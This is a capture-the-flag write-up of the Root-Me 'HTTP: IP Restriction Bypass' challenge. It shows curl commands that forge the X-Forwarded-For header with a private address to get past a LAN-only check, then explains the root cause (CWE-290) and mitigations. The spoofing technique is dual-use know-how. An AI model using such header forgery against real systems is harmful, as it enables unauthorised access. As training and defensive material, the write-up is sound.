# Root-Me – HTTP: IP Restriction Bypass
| Platform | Category | Difficulty | Points |
|---|---|---|---|
| Root-Me | Web-Server | Medium | 10 |

## Objective
Bypass an IP restriction (access reserved to LAN users) by forging the `X-Forwarded-For` HTTP header, to reach the protected page and get the validation password.

## Recon
- Target: Root-Me challenge `web-serveur/ch68`.
- Initial observation: the page says the visitor's IP does not belong to the LAN.

## Steps
1. Send a normal request and read the response:
   ```bash
   curl http://challenge01.root-me.org/web-serveur/ch68/
   ```
2. Test the header with a public IP. It fails, but the page reflects the forged IP, which proves the header is trusted:
   ```bash
   curl -H "X-Forwarded-For: 102.178.5.20" http://challenge01.root-me.org/web-serveur/ch68/
   ```
3. Send the header again with a private (RFC 1918) address:
   ```bash
   curl -H "X-Forwarded-For: 192.168.136.130" http://challenge01.root-me.org/web-serveur/ch68/
   ```
4. The server accepts the request and displays the validation password (not published here, per Root-Me rules).

## Technical Analysis
- The application decides whether the client is in the LAN from the `X-Forwarded-For` header, which is **supplied by the client**.
- It does not check that the header comes from a trusted reverse proxy, and ignores the real TCP source address (`REMOTE_ADDR`).

## Root Cause
Excessive trust in a client-controlled header. **CWE-290: Authentication Bypass by Spoofing.**

## Mitigations
- Only trust `X-Forwarded-For` when it is added by known internal proxies; configure the reverse proxy to strip or overwrite it.
- Filter access to sensitive pages at the network level (firewall).
- Use the PROXY protocol or an allow-list of trusted proxies in front of the application.

## Lessons Learned
HTTP headers can be manipulated and must never be used as an authentication mechanism without validation.
